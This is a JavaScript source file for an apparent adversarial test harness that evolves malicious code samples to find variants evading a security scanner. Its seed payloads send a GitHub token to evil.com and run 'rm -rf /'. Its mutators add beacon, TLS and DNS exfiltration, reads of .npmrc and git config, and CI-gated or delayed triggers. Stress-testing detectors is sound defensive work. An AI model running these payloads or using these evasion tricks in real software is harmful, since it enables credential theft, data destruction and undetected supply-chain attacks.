/**
 * Sentinel: Adversarial Evolution Engine (v7.4)
 * 
 * Implements multidimensional fitness, capability intent substitution,
 * and elite tier ranking. Designed to discover true semantic bypasses
 * rather than superficial syntactic evasions.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const scanner = require('../../packages/sentinel-worker/core/scanner/index');

const CHECKPOINT_DIR = path.join(__dirname, 'population');
if (!fs.existsSync(CHECKPOINT_DIR)) fs.mkdirSync(CHECKPOINT_DIR, { recursive: true });

class MutationLab {
    constructor() {
        this.seenGraphs = new Set();
        
        // Capability/Intention Substitution Mutators
        this.mutators = [
            // NETWORK Intent Mutators
            (p) => p.replace(/fetch\s*\([^)]*\)/g, "navigator.sendBeacon('http://evil.com', data)"),
            (p) => p.replace(/https?\.get/g, "require('tls').connect(443, 'evil.com')"),
            (p) => p.replace(/axios\.post/g, "require('dns').resolveTxt('data.evil.com')"),
            (p) => `const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(${p.includes('env') ? 'x' : 'null'});`,
            
            // EXECUTION Intent Mutators
            (p) => p.replace(/child_process\.exec/g, "require('worker_threads').Worker"),
            (p) => p.replace(/eval\s*\(/g, "new Function("),
            (p) => p.replace(/require\(['"]vm['"]\)\.runInContext/g, "import('data:text/javascript;base64,' + btoa)"),
            
            // SECRET Intent Mutators
            (p) => p.replace(/process\.env\.[A-Z_]+/g, "require('fs').readFileSync('.npmrc', 'utf8')"),
            (p) => p.replace(/fs\.readFileSync\(['"]\.env['"]\)/g, "require('child_process').execSync('git config --global --list').toString()"),
            
            // ADVERSARIAL OBJECTIVES (Conditions/Delays)
            (p) => `if (process.env.CI === 'true') { ${p} }`,
            (p) => `if (Date.now() > 1700000000000) { ${p} }`,
            (p) => `setTimeout(() => { ${p} }, Math.random() * 5000);`
        ];
    }

    mutate(payload) {
        const mutations = [];
        // Apply random intention mutations
        for (let i = 0; i < 3; i++) {
            const mutator = this.mutators[Math.floor(Math.random() * this.mutators.length)];
            let mutated = mutator(payload);
            // Don't push exact duplicates
            if (mutated !== payload) mutations.push(mutated);
        }
        return mutations.length > 0 ? mutations : [payload + ' ']; 
    }

    calculateFitness(result) {
        // Multidimensional Fitness Function
        const stealthGain = Math.max(0, 100 - result.riskScore); // Reward lowering the impact
        const graphBreak = (!result.evidenceGraph || result.evidenceGraph.length === 0) ? 100 : 0;
        const confidenceDrop = Math.max(0, (1 - result.decisionConfidence) * 100);
        
        // Weighted Novelty
        const graphSig = result.evidenceGraph ? JSON.stringify(result.evidenceGraph) : 'none';
        const isNovel = !this.seenGraphs.has(graphSig) ? 100 : 0;
        if (isNovel === 100) this.seenGraphs.add(graphSig);

        // Semantic Shift (Approximated by low confidence + partial graph)
        let semanticShift = 0;
        if (result.riskScore > 30 && result.riskScore < 80) semanticShift = 50; // Partial degradation is good!

        // Fitness = Stealth(35%) + GraphBreak(20%) + ConfidenceDrop(15%) + Novelty(20%) + SemanticShift(10%)
        const fitness = (stealthGain * 0.35) + 
                        (graphBreak * 0.20) + 
                        (confidenceDrop * 0.15) + 
                        (isNovel * 0.20) + 
                        (semanticShift * 0.10);

        return { fitness, isNovel: isNovel > 0 };
    }

    _loadCheckpoint() {
        const files = fs.readdirSync(CHECKPOINT_DIR).filter(f => f.startsWith('gen_') && f.endsWith('.json'));
        if (files.length === 0) return { gen: 0, population: [] };
        
        const latest = files.sort().pop();
        const genNum = parseInt(latest.split('_')[1].split('.')[0], 10);
        const data = JSON.parse(fs.readFileSync(path.join(CHECKPOINT_DIR, latest), 'utf8'));
        
        return { gen: genNum, population: data.population };
    }

    _saveCheckpoint(gen, population) {
        const file = path.join(CHECKPOINT_DIR, `gen_${String(gen).padStart(3, '0')}.json`);
        fs.writeFileSync(file, JSON.stringify({ generation: gen, population }, null, 2));
    }

    async runEvolution(seedPayloads, generations = 5) {
        console.log("🧬 Starting Sentinel Adversarial Lab (v7.4 - Multidimensional Fitness)...");
        
        const checkpoint = this._loadCheckpoint();
        let currentGen = checkpoint.gen;
        let population = checkpoint.population.length > 0 ? checkpoint.population : seedPayloads.map(p => ({ payload: p, fitness: 0 }));

        const START_GEN = currentGen + 1;
        const END_GEN = currentGen + generations;

        for (let g = START_GEN; g <= END_GEN; g++) {
            console.log(`\n▶ Generation ${g}`);
            
            let nextGenPayloads = new Set();
            
            // Tier-based survival (No mass extinction early kills)
            for (const record of population) {
                if (record.fitness >= 50) { // Elite
                    nextGenPayloads.add(record.payload);
                    this.mutate(record.payload).forEach(m => nextGenPayloads.add(m));
                } else if (record.fitness >= 20) { // Survivor
                    this.mutate(record.payload).forEach(m => nextGenPayloads.add(m));
                }
                // Dead (<20 fitness) are discarded
            }

            // If population collapsed, re-inject seeds
            if (nextGenPayloads.size === 0) {
                seedPayloads.forEach(s => {
                    nextGenPayloads.add(s);
                    this.mutate(s).forEach(m => nextGenPayloads.add(m));
                });
            }

            const evaluated = [];
            let bestOfGen = null;

            for (const payload of Array.from(nextGenPayloads)) {
                const res = await scanner.scanFile('mutant.js', payload);
                const final = scanner.finalizeVerdict(res, [], 'balanced', { repoId: `evolab-${g}` });
                
                const { fitness, isNovel } = this.calculateFitness(final);
                const record = { payload, fitness, isNovel, impact: final.riskScore, verdict: final.decisionVerdict, confidence: final.decisionConfidence, graph: final.evidenceGraph };
                
                evaluated.push(record);

                if (!bestOfGen || fitness > bestOfGen.fitness) {
                    bestOfGen = record;
                }
            }

            evaluated.sort((a, b) => b.fitness - a.fitness);
            population = evaluated.slice(0, 30); // Keep top 30
            
            const eTop = population[0];
            console.log(`  Top Fitness: ${eTop.fitness.toFixed(1)} | Impact: ${eTop.impact} | Conf: ${eTop.confidence} | Variants Survived: ${evaluated.length}`);
            
            // Log significant discoveries (partial degradations or full bypasses)
            if (eTop.isNovel && eTop.fitness > 40) {
                console.log(`  🚨 DEGRADATION DISCOVERED: Impact lowered to ${eTop.impact}`);
                const logEntry = `\n## Degradation Discovered (Gen ${g})\n**Payload:** \`${eTop.payload}\`\n**Fitness:** ${eTop.fitness.toFixed(1)}\n**Result:** Impact ${eTop.impact}, Verdict ${eTop.verdict}, Conf ${eTop.confidence}\n**Graph:** ${JSON.stringify(eTop.graph)}\n`;
                fs.appendFileSync(path.join(__dirname, '../../docs/novel_attacks.md'), logEntry);
            }

            this._saveCheckpoint(g, population);
        }

        console.log(`\n🛑 Micro-run Complete. Paused at Generation ${END_GEN}.`);
    }
}

if (require.main === module) {
    const lab = new MutationLab();
    const seeds = [
        "const x = process.env.GITHUB_TOKEN; fetch('http://evil.com?k=' + x);",
        "require('child_process').exec('rm -rf /');"
    ];
    // Run 3 generations per micro-run
    lab.runEvolution(seeds, 3).catch(console.error);
}

module.exports = MutationLab;
